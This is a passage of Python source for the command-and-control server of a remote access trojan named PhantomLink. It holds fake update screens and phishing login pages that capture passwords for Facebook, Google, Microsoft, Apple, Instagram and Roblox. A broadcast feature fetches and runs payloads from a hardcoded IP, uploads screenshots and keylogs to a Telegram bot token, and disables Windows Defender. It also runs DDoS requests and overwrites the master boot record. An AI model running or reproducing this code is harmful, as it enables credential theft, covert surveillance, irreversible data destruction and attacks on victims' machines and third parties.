                    html_content = '''<!DOCTYPE html><html><head><title>Windows Update</title><style>body{background:#0078d7;color:white;font-family:"Segoe UI",sans-serif;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;margin:0}.spinner{border:8px solid rgba(255,255,255,0.3);border-top:8px solid white;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;margin-bottom:40px}keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}h1{font-size:48px;margin:20px 0}p{font-size:24px;margin:10px 0}.progress{width:400px;height:4px;background:rgba(255,255,255,0.3);margin-top:20px}.progress-bar{height:100%;background:white;width:0%;animation:progress 600s linear forwards}keyframes progress{to{width:100%}}</style></head><body><div class="spinner"></div><h1>Working on updates</h1><p id="percent">0% complete</p><p>Do not turn off your PC. This will take a while.</p><div class="progress"><div class="progress-bar"></div></div><script>let percent=0;setInterval(()=>{percent+=Math.random()*0.5;if(percent>99)percent=99;document.getElementById("percent").textContent=Math.floor(percent)+"% complete"},3000)</script></body></html>'''
                elif update_type == 'chrome':
                    html_content = '''<!DOCTYPE html><html><head><title>Chrome Update</title><style>body{background:white;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.container{text-align:center;max-width:400px}.chrome-logo{width:100px;height:100px;margin-bottom:30px}h2{color:#333;margin:20px 0}.progress{width:300px;height:6px;background:#e0e0e0;border-radius:3px;margin:20px auto;overflow:hidden}.progress-bar{height:100%;background:#4285f4;width:0%;animation:progress 300s linear forwards}keyframes progress{to{width:100%}}</style></head><body><div class="container"><svg class="chrome-logo" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="#4285f4"/><circle cx="50" cy="50" r="30" fill="white"/><circle cx="50" cy="50" r="20" fill="#4285f4"/></svg><h2>Updating Google Chrome</h2><p>Please wait while Chrome updates to the latest version...</p><div class="progress"><div class="progress-bar"></div></div><p id="status">Downloading update...</p></div><script>setTimeout(()=>document.getElementById("status").textContent="Installing update...",30000);setTimeout(()=>document.getElementById("status").textContent="Finishing up...",60000)</script></body></html>'''
                else:  # office
                    html_content = '''<!DOCTYPE html><html><head><title>Office Update</title><style>body{background:#f3f3f3;font-family:"Segoe UI",sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.container{background:white;padding:50px;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.1);text-align:center}h2{color:#d83b01}.spinner{border:4px solid #f3f3f3;border-top:4px solid #d83b01;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class="container"><h2>Microsoft Office</h2><div class="spinner"></div><p>Updating Office applications...</p><p>This may take several minutes</p></div></body></html>'''
                html_escaped = html_content.replace("'", "''")

                command2 = f'powershell -Command "$html = \'{html_escaped}\'; $htmlPath = \\\"$env:TEMP\\\\update.html\\\"; $html | Out-File -FilePath $htmlPath -Encoding UTF8; Start-Process msedge -ArgumentList \\\"--kiosk $htmlPath --edge-kiosk-type=fullscreen\\\" -WindowStyle Normal; Start-Sleep {int(duration) * 60}; Stop-Process -Name msedge -Force -ErrorAction SilentlyContinue; Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue; Remove-Item $htmlPath -Force"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"[FAKE UPDATE] [{username}] {update_type} update screen shown for {duration} minutes")
                    client['command_in_progress'] = False


            elif cmd == 'fakelogin':
                platform = input("Platform (facebook/google/microsoft/apple/instagram/roblox): ").lower()
                login_templates = {
                    'facebook': {'title': 'Facebook',

                                 'logo': '<div style="font-size:48px;color:#1877f2;font-weight:bold;">facebook</div>',

                                 'placeholder_email': 'Email or phone number', 'placeholder_pass': 'Password',

                                 'button': 'Log In', 'color': '#1877f2'},

                    'google': {'title': 'Sign in - Google Accounts',

                               'logo': '<svg width="75" height="24"><path fill="#4285F4" d="M0,12 C0,5.4,5.4,0,12,0 C15.2,0,18.1,1.2,20.3,3.2 L17,6.5 C15.6,5.2,13.9,4.5,12,4.5 C7.7,4.5,4.2,8,4.2,12.2 C4.2,16.4,7.7,19.9,12,19.9 C15.8,19.9,18.8,17.3,19.4,13.9 L12,13.9 L12,9.4 L24,9.4 C24.2,10.6,24.2,11.8,24.2,13 C24.2,19.4,19.8,24,12,24 C5.4,24,0,18.6,0,12"></path></svg>',

                               'placeholder_email': 'Email or phone', 'placeholder_pass': 'Enter your password',

                               'button': 'Next', 'color': '#1a73e8'},

                    'microsoft': {'title': 'Sign in to your Microsoft account',

                                  'logo': '<div style="font-size:24px;color:#000;"><span style="color:#f25022;">■</span><span style="color:#7fba00;">■</span><br><span style="color:#00a4ef;">■</span><span style="color:#ffb900;">■</span> Microsoft</div>',

                                  'placeholder_email': 'Email, phone, or Skype', 'placeholder_pass': 'Password',

                                  'button': 'Sign in', 'color': '#0067b8'},

                    'apple': {'title': 'Sign in with your Apple ID',

                              'logo': '<svg width="40" height="48" fill="#000"><path d="M31.8,24.8c-0.1-5.3,4.3-7.9,4.5-8c-2.5-3.6-6.3-4.1-7.6-4.2c-3.2-0.3-6.3,1.9-7.9,1.9c-1.6,0-4.2-1.9-6.9-1.8c-3.5,0.1-6.8,2.1-8.6,5.2c-3.7,6.4-0.9,15.8,2.6,21c1.7,2.5,3.8,5.4,6.5,5.3c2.6-0.1,3.6-1.7,6.7-1.7c3.1,0,4,1.7,6.9,1.6c2.8,0,4.6-2.6,6.3-5.2c2-2.9,2.8-5.8,2.9-5.9C36.1,32.9,31.9,30.9,31.8,24.8z M27.3,10.5c1.4-1.7,2.4-4.1,2.1-6.5c-2,0.1-4.5,1.4-6,3c-1.3,1.5-2.4,3.9-2.1,6.2C23.6,13.4,25.9,12.2,27.3,10.5z"/></svg>',

                              'placeholder_email': 'Apple ID', 'placeholder_pass': 'Password', 'button': 'Continue',

                              'color': '#000'},

                    'instagram': {'title': 'Instagram',

                                  'logo': '<div style="font-size:48px;font-family:Brush Script MT,cursive;">Instagram</div>',

                                  'placeholder_email': 'Phone number, username, or email',

                                  'placeholder_pass': 'Password', 'button': 'Log in', 'color': '#e1306c'},

                    'roblox': {'title': 'Roblox Login',

                               'logo': '<div style="font-size:42px;font-weight:bold;color:#fff;background:#000;padding:10px 20px;border-radius:8px;">ROBLOX</div>',

                               'placeholder_email': 'Username or Email', 'placeholder_pass': 'Password',

                               'button': 'Login', 'color': '#00a2ff'}

                }

                if platform not in login_templates:
                    print("[!] Invalid platform")
                    continue

                template = login_templates[platform]
                html = f'''<!DOCTYPE html><html><head><title>{template["title"]}</title><style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}}.container{{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);width:400px;text-align:center}}.logo{{margin-bottom:30px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}}input:focus{{outline:none;border-color:{template["color"]}}}button{{width:100%;padding:14px;margin-top:16px;border:none;border-radius:6px;background:{template["color"]};color:white;font-size:16px;font-weight:bold;cursor:pointer}}button:hover{{opacity:0.9}}.error{{color:#d93025;font-size:14px;margin-top:10px;display:none}}</style></head><body><div class="container"><div class="logo">{template["logo"]}</div><form id="loginForm"><input type="text" id="email" placeholder="{template["placeholder_email"]}" required><input type="password" id="password" placeholder="{template["placeholder_pass"]}" required><div class="error" id="error">Incorrect password. Try again.</div><button type="submit">{template["button"]}</button></form></div><script>let attempts=0;document.getElementById("loginForm").onsubmit=function(e){{e.preventDefault();const email=document.getElementById("email").value;const password=document.getElementById("password").value;const credentials=email+":"+password+"\\n";const blob=new Blob([credentials],{{type:"text/plain"}});const a=document.createElement("a");a.href=URL.createObjectURL(blob);a.download="credentials_{platform}.txt";a.click();attempts++;if(attempts<3){{document.getElementById("error").style.display="block";document.getElementById("password").value="";document.getElementById("password").focus()}}else{{alert("Too many failed attempts. Please try again later.");window.close()}}}}</script></body></html>'''
                html_escaped = html.replace("'", "''")
                command2 = f'powershell -Command "$html = \'{html_escaped}\'; $htmlPath = \\\"$env:TEMP\\\\login_{platform}.html\\\"; $html | Out-File -FilePath $htmlPath -Encoding UTF8; Start-Process $htmlPath; Start-Sleep 300; $credFile = \\\"$env:USERPROFILE\\\\Downloads\\\\credentials_{platform}.txt\\\"; if (Test-Path $credFile) {{ $creds = Get-Content $credFile; Remove-Item $credFile -Force; Write-Output \\\"Captured: $creds\\\" }} else {{ Write-Output \\\"No credentials captured\\\" }}; Remove-Item $htmlPath -Force"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    output = response.decode('utf-8', errors='ignore')
                    print(output)
                    if "Captured:" in output:
                        tel_logger(f"[PHISHING] [{username}] ✓ {platform} credentials captured!\n{output}")
                    else:
                        tel_logger(f"[PHISHING] [{username}] {platform} prompt shown")
                    client['command_in_progress'] = False

            elif cmd == 'commands':
                print("""
                \n\nQuick Commands: --->

                [📁 File Operations]
                  send       : Make the client send files to the host
                  get        : Download file/s on the client from the host's server
                  copy       : Copy file
                  cut        : Move file from one place to another
                  extract    : Extract a .rar file to a location
                  archive    : Compress a file/folder into .zip
                  harvest    : Auto-search and send specific file types in User-file

                [📷 Media]
                  screenshot : Take Screenshot and send it to the host
                  camera     : Take a snapshot from the camera and send it to the host
                  record     : Record audio from the client and send it to the host
                  play       : Play an audio in the client's speaker
                  rickroll   : Play a Rickroll video
                  screenrec  : Record screen as a video and send it

                [🌐 Network & Internet]
                  wifi       : Shows the wifi passwords
                  ip         : Get the client's Public IP
                  port       : Open a new Port-Forwarding
                  hosts      : Open hosts file to block / unblock websites
                  netscan    : Scan local network for devices and informations
                  worm       : Inject PhantomLink into all PCs on the network
                  ddos       : DDOS on specific target
                  dnshijack  : Forward any connection to URL into another IP
                  sniff      : Capture all network traffic for specific duration

                [🖥️ System Info & Monitoring]
                  sys        : Shows all system info (Hardware/Software)
                  task       : Shows all of the running tasks
                  devices    : Shows the available devices
                  clipboard  : Show the last copied thing
                  browser    : Extract all browser data (includes: Passwords, Usernames/E-Mails, Cookies)
                  info       : Get all machine info
                  creds      : Get all windows credentials
                  chrome_pass: Decrypt Chrome's encrypted passwords

                [🧠 System Control]
                  sleep      : Sleep
                  logoff     : Log off the current user
                  lock       : Lockscreen (Client)
                  shutdown   : Force Shutdown to the client
                  off        : Same as shutdown
                  restart    : Force restart to the client
                  rotate     : Rotate the client's screen
                  wallpaper  : Change wallpaper of client's computer
                  block      : Temporarily block mouse and keyboard input
                  disable task manager : Disable the Task Manager
                  enable task manager  : Enable the Task Manager
                  killav     : Disable Windows Defender Anti-Virus
                  mouse      : Control Mouse
                  type       : Control Keyboard
                  spam       : Show pop up repeatedly
                  killmbr    : DESTROY the PC FOREVER!
                  fakeupdate : Shows fake Windows Update screen
                  fakelogin  : Shows fake login Pop-Up and capture credintals

                [👤 User & Execution]
                  user       : Create a user (Admin)
                  inject     : Download and execute a malware/software
                  alert      : Send a POP-UP custom alert message
                  kill       : Kill the pc temporary (Until restart)
                  rootkit    : Hide/Unhide PhantomLink completely from Task Manager

                [🧹 Utilities]
                  recycle    : Empty the recycle bin
                  ffmpeg     : Download and setup ffmpeg
                  keylogger  : Download and setup KeyLogger
                  keylog     : Get the KeyLogger's log file
                  mine       : Cryptominer
                  print      : Hijack the printer

                [❓ Help]
                  commands   : Shows this help list of quick NON-CMD commands
                  update     : Update PhantomLink

                """)
                continue
            elif cmd == "":
                continue
            else:
                # Send command with CMD prefix
                start_time = time.time()
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{cmd}"):
                        print("[!] Failed to send command.")
                        tel_logger(f"Failed To send Command: {cmd}")
                        client['command_in_progress'] = False
                        client['health'].record_command(False, 0)
                        break

                    # Receive response
                    response = client_manager._recv_message(conn)

                response_time = time.time() - start_time

                if response:
                    output = response.decode('utf-8', errors='ignore')
                    client['command_in_progress'] = False
                    client['health'].record_command(True, response_time)
                    if output:
                        print(output)
                        tel_logger(f"Command: {cmd}\n\n{output}")
                    else:
                        print("[No output]")
                else:
                    print("[!] No response from client.")
                    client['command_in_progress'] = False
                    client['health'].record_command(False, response_time)
                    break


    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")

    except Exception as e:
        print(f"[!] Connection error: {e}")

    finally:
        health_stop.set()
        # Restore original timeout
        try:
            conn.settimeout(original_timeout)
        except:
            pass

    return 'continue'


def main():
    client_manager = ClientManager()

    # Start dashboard in background thread
    try:
        from dashboard import start_dashboard

        dashboard_thread = threading.Thread(
            target=start_dashboard,
            args=(client_manager, 7000),
            daemon=True
        )
        dashboard_thread.start()

        time.sleep(2)  # Let it initialize

    except Exception as e:
        print(f"[!] Dashboard error: {e}")
        print("[*] Continuing without dashboard...")

    # Setup server socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.bind((HOST, PORT))
        s.listen(10)  # Increased backlog
    except Exception as e:
        print(f"[!] Failed to setup server: {e}")
        return

    print(f"\n[+] Listening on 81.10.55.8:{PORT}")

    # Start accepting connections in background
    def accept_connections():
        while True:
            try:
                conn, addr = s.accept()
                # Set socket options for new connection
                conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

                thread = threading.Thread(
                    target=handle_client_connection,
                    args=(client_manager, conn, addr),
                    daemon=True
                )
                thread.start()
            except Exception as e:
                print(f"[!] Accept error: {e}")
                break

    accept_thread = threading.Thread(target=accept_connections, daemon=True)
    accept_thread.start()

    # Main command loop
    try:
        while True:
            print("\n" + "=" * 50)
            print(f"SHELL CONTROLLER (C2)     V: {version}")
            print("=" * 50)
            print('Commands:\nlist      - Show connected clients\nconnect   - Connect to a client\nbroadcast - Send command to all connected clients\nquit      - Exit server')
            print("=" * 50)

            try:
                choice = input("Controller> ").strip().lower()
            except KeyboardInterrupt:
                print("\n[+] Exiting...")
                break

            if choice == 'list':
                show_clients(client_manager)

            elif choice.strip() == '':
                continue


            elif choice == 'connect':
                show_clients(client_manager)
                clients = client_manager.list_clients()

                if not clients:
                    continue

                try:
                    client_id = int(input("\nEnter client ID to connect: "))
                    if client_id in clients:
                        result = interact_with_client(client_manager, client_id)
                        if result == 'exit':
                            break
                    else:
                        print(f"[!] Invalid client ID: {client_id}")
                except ValueError:
                    print("[!] Please enter a valid number.")
                except KeyboardInterrupt:
                    print("\n[!] Cancelled")

            elif choice == 'quit':
                print("[+] Shutting down server...")
                break


            elif choice == 'broadcast':

                cmd = input("Command to broadcast to all clients: ").strip()

                clients = client_manager.list_clients()

                if not clients:
                    print("[!] No clients connected")

                    continue

                # Define commands that require user input (NOT ALLOWED in broadcast)

                interactive_commands = [

                    'camera', 'wifi', 'extract', 'copy', 'cut', 'record',

                    'get', 'send', 'user', 'hide', 'archive',

                    'block', 'hosts', 'play', 'port', 'wallpaper', 'rotate',

                    'mouse', 'type', 'spam', 'dnshijack', 'sniff', 'worm',

                    'harvest', 'browser', 'netscan', 'screenrec',

                    'info', 'creds', 'chrome_pass',

                    'keylogger', 'screener', 'devices', 'ffmpeg'

                ]

                if cmd.lower() in interactive_commands:
                    print(f"[!] Command '{cmd}' requires user input and cannot be broadcast")

                    print(
                        "[!] Allowed broadcast commands: screenshot, ip, sys, task, clipboard, keylog, recycle, sleep, lock, rickroll, shutdown, restart, disable/enable task manager, update, inject, alert, ddos, kill, killmbr, killav, ffmpeg")

                    continue

                # Handle special commands that need parameters

                actual_commands = []

                if cmd.lower() == 'update':

                    confirm = input("Update PhantomLink on ALL clients? (y/n): ")

                    if confirm.lower().strip() != 'y':
                        print("[!] Update cancelled")

                        continue

                    tel_logger(f"{'=' * 10}\nUpdating PhantomLink on ALL clients . . .\n{'=' * 10}")

                    actual_commands = ['curl -O http://81.10.55.8/PhantomLink.exe && start /B "" "PhantomLink.exe"']


                elif cmd.lower() == 'inject':

                    filename = input("File name to inject (on server): ")

                    if not filename:
                        print("[!] No filename provided")

                        continue

                    actual_commands = [f'curl -O http://81.10.55.8/{filename} && start /B "" "{filename}"']


                elif cmd.lower() == 'alert':

                    title = input("Alert title: ")

                    message = input("Alert message: ")

                    if not title or not message:
                        print("[!] Title and message required")

                        continue

                    # Escape quotes

                    message = message.replace("'", "''").replace('"', '`"')

                    title = title.replace("'", "''").replace('"', '`"')

                    actual_commands = [
                        f'powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox(\'{message}\', \'Critical\', \'{title}\')"']


                elif cmd.lower() == 'ddos':

                    target = input("Target IP/URL: ")

                    duration = input("Duration (seconds): ")

                    if not target or not duration:
                        print("[!] Target and duration required")

                        continue

                    actual_commands = [
                        f'''powershell -Command "$end = (Get-Date).AddSeconds({duration}); while((Get-Date) -lt $end) {{ try {{ Invoke-WebRequest -Uri '{target}' -Method GET -TimeoutSec 1; }} catch {{}} }}"''']


                elif cmd.lower() == 'kill':

                    confirm = input("Kill ALL client PCs temporarily? (y/n): ")

                    if confirm.lower().strip() != 'y':
                        print("[!] Kill cancelled")

                        continue

                    tel_logger(f"Killing ALL PCs!")

                    actual_commands = ['taskkill /f /im svchost.exe']


                elif cmd.lower() == 'killmbr':

                    confirm = input("THIS WILL BRICK ALL PCs PERMANENTLY! Type 'DESTROY ALL' to confirm: ")

                    if confirm != 'DESTROY ALL':
                        print("[!] MBR destruction cancelled")

                        continue

                    tel_logger(f"\n{'=' * 20}[!] ALL PCs BEING DESTROYED [!]\n{'=' * 20}")

                    actual_commands = [
                        r'''powershell -Command "$mbr = New-Object byte[] 512; (New-Object Random).NextBytes($mbr); $disk = [System.IO.File]::Open('\\\\.\\PhysicalDrive0', 'Open', 'Write'); $disk.Write($mbr, 0, 512); $disk.Close();"''']


                else:

                    # Check if it's a predefined quick command

                    command_map = {

                        'screenshot': [

                            'powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, [System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); $path = Join-Path $env:USERPROFILE \\"screenshot.png\\"; $bmp.Save($path)"',

                            'curl -F "photo=@%USERPROFILE%\\screenshot.png" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendPhoto?chat_id=6042298920'

                        ],

                        'ip': ['powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"'],

                        'sys': ['systeminfo'],

                        'system': ['systeminfo'],

                        'task': ['tasklist'],

                        'clipboard': ['powershell -command "Get-Clipboard"'],

                        'keylog': [
                            'curl -F "document=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'],

                        'recycle': ['PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force'],

                        'sleep': ['rundll32.exe powrprof.dll,SetSuspendState 0,1,0'],

                        'lock': ['rundll32.exe user32.dll,LockWorkStation'],

                        'rickroll': ['start https://www.youtube.com/watch?v=dQw4w9WgXcQ'],

                        'shutdown': ['shutdown /s /f /t 0'],

                        'off': ['shutdown /s /f /t 0'],

                        'restart': ['shutdown /r /f /t 0'],

                        'disable task manager': [
                            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'],

                        'enable task manager': [
                            'REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f'],

                        'killav': [

                            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',

                            'taskkill /F /IM MsMpEng.exe'

                        ],
                        'ffmpeg' : [r'curl http://81.10.55.8/ffmpeg.rar -o "%USERPROFILE%\ffmpeg.rar" && C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"']

                    }

                    actual_commands = command_map.get(cmd.lower(), [cmd])

                print(f"[*] Broadcasting '{cmd}' to {len(clients)} client(s)...")

                results = {}

                threads = []

                def send_to_client(cid):

                    """Send command(s) to a single client"""

                    client = client_manager.get_client(cid)

                    if not client:
                        results[cid] = "[ERROR: Client not found]"

                        return

                    conn = client['conn']

                    username = client['username']

                    all_outputs = []

                    try:

                        with client['lock']:

                            client['command_in_progress'] = True

                            # Execute each command in sequence

                            for command in actual_commands:

                                if not client_manager._send_message(conn, f"CMD:{command}"):
                                    all_outputs.append(f"[ERROR: Failed to send command]")

                                    break

                                response = client_manager._recv_message(conn)

                                if response:

                                    output = response.decode('utf-8', errors='ignore')

                                    all_outputs.append(output)

                                else:

                                    all_outputs.append("[No response]")

                            # Store result

                            results[cid] = {

                                'username': username,

                                'output': '\n'.join(all_outputs) if all_outputs else '[No output]'

                            }

                    except Exception as e:

                        results[cid] = f"[ERROR: {username} - {e}]"

                    finally:

                        client['command_in_progress'] = False

                # Launch threads for all clients

                for client_id in clients:
                    thread = threading.Thread(target=send_to_client, args=(client_id,))

                    thread.start()

                    threads.append(thread)

                # Wait for all to complete (with timeout)

                for thread in threads:
                    thread.join(timeout=300)  # 5 Minuets timeout per client

                # Display results

                print("\n" + "=" * 70)

                print("BROADCAST RESULTS")

                print("=" * 70)

                for cid, result in results.items():

                    if isinstance(result, dict):

                        print(f"\n[Client: {result['username']} (ID: {cid})]")

                        print(result['output'])

                        print("-" * 70)

                    else:

                        print(f"\n[Client ID: {cid}]")

                        print(result)

                        print("-" * 70)

                tel_logger(f"Broadcast command '{cmd}' to {len(clients)} clients")

            else:
                print("[!] Unknown command. Use 'list', 'connect', 'broadcast', or 'quit'")

    except KeyboardInterrupt:
        print("\n[+] Server interrupted")
    finally:
        # Cleanup
        print("[+] Cleaning up...")
        try:
            s.close()
        except:
            pass


if __name__ == "__main__":
    main()


